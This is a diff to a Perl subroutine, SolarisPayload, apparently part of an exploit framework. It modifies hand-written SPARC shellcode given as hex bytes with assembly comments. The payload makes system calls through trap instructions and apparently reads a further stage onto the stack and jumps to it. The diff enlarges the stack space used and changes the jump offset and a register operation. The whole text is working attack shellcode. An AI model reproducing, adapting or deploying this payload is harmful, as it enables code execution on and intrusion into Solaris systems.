@@ -32,6 +32,10 @@ sub SolarisPayload {
 
     my $hash = {
         Payload =>
+			
+			# clear some stack space...
+			"\x9c\x23\xa1\x04".		# sub %sp, 0x104, %sp
+			
             "\x90\x10\x20\x02".     # mov          2, %o0
             "\x92\x10\x20\x02".     # mov          2, %o1
             "\x94\x08\x2f\xed".     # and          %g0, 4077, %o2
@@ -59,13 +63,19 @@ sub SolarisPayload {
             "\x90\x25\xff\xff".     # sub          %l7, -1, %o0
             "\x82\x10\x20\xea".     # mov          234, %g1
             "\x91\xd0\x20\x08".     # ta           0x8
-            "\x92\x23\xa0\x18".     # sub          %sp, 24, %o1
+
+#            "\x92\x23\xa0\x18".     # sub          %sp, 24, %o1
+# More space...
+			"\x92\x23\xb0\x04".     # sub          %sp, 0x404, %o1
+
             "\x95\x2a\x20\x0f".     # sll          %o0, 15, %o2
             "\x82\x10\x20\x03".     # mov          3, %g1
-            "\xae\x1d\x80\x08".     # xor          %l6, %o0, %l7
-            "\xae\x1c\xc0\x16".     # xor          %l3, %l6, %l7
-            "\x91\xd0\x20\x08".     # ta           0x8
-            "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
+            "\x88\x1d\x40\x08".     # xor  		   %l5, %o0, %g4
+			"\x91\xd0\x20\x08".     # ta           0x8
+
+#            "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
+			"\x9f\xc3\xaf\xfc".     # jmpl         %sp + 4092
+			
             "\xac\x1d\x80\x16",     # xor          %l6, %l6,%l6
     };
     
